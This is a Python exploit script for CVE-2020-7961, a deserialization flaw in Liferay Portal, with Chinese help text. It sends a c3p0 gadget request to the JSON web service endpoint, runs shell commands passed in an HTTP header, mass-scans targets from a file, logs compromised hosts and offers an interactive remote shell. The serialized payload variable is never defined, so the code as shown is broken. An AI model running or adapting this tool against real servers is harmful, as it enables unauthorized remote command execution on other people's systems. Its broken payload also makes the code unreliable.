# 作者: VulnExpo
# 日期: 2023-10-9

import sys
import argparse
import requests
import time
import json
import re
from urllib.parse import urlparse
import random

requests.packages.urllib3.disable_warnings()

def check_for_vulnerability(url, cmd, interactive=False, proxies={}, success_file=None):
    try:
        payload
        post_data = (
            'cmd={"/expandocolumn/update-column":{}}&p_auth=test&formDate=2020&columnId=1&name=1&type=1&defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={"userOverridesAsString":"HexAsciiSerializedMap:'+payload+';"}'
        )
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
            "jk": cmd
        }
        api_url = '{url}/api/jsonws/invoke'.format(url=url)
        resp = requests.post(url=api_url, data=post_data, headers=headers, timeout=60, verify=False, allow_redirects=False)
        pattern = '~~~(.*?)~~~'
        match = re.search(pattern, resp.content.decode('utf-8'), re.S | re.I)
        if match:
            result = match.group(1)
            result = result.strip()
            with open(success_file, 'a') as s_file:
                s_file.write(f"++++++++++++++++++\n")
                s_file.write(f"目标URL: {url}\n")
                s_file.write(f"Payload: {cmd}\n")
                s_file.write(f"响应内容:\n{result}\n\n")

            if interactive:
                print(f"目标URL: {url}")
                print(f"Payload: {cmd}")
                print(f"响应内容:\n{result}\n")
                while True:
                    user_input = input("请输入要执行的命令或输入'exit'退出: ")
                    if user_input == 'exit':
                        break
                    interactive_cmd = user_input.strip()
                    interactive_result = check_for_vulnerability(url, interactive_cmd, False, proxies, success_file)
                    if interactive_result:
                        print(f"响应内容:\n{interactive_result}\n")

            return result  # 返回结果字符串
    except Exception as e:
        print(f"发生异常：{e}")
    return None

def scan_targets(targets, cmd, interactive=False, proxies={}, success_file=None):
    for target in targets:
        target = target.strip()
        check_for_vulnerability(target, cmd, interactive, proxies, success_file)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Liferay Portal JSONS反序列化漏洞CVE-2020-7961")
    parser.add_argument("-u", "--url", help="目标URL")
    parser.add_argument("-f", "--file", default="url.txt", help="目标URL列表，默认为url.txt")
    parser.add_argument("-c", "--cmd", help="要执行的命令")
    parser.add_argument("-i", "--interactive", action="store_true", help="启用交互式Shell模式")
    args = parser.parse_args()

    if not args.url and not args.file:
        print("请使用 -u 指定要扫描的目标URL或使用默认文件 url.txt。")
        exit(1)

    if args.url:
        urls = [args.url]
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.readlines()

    proxies = {}
    success_file = 'success_targets.txt'

    for url in urls:
        url = url.strip()
        if not url.startswith("http://") and not url.startswith("https://"):
            scan_targets(["http://" + url, "https://" + url], args.cmd, args.interactive, proxies, success_file)
        else:
            scan_targets([url], args.cmd, args.interactive, proxies, success_file)

    print("扫描完成，成功的目标已保存到 success_targets.txt 文件中。")
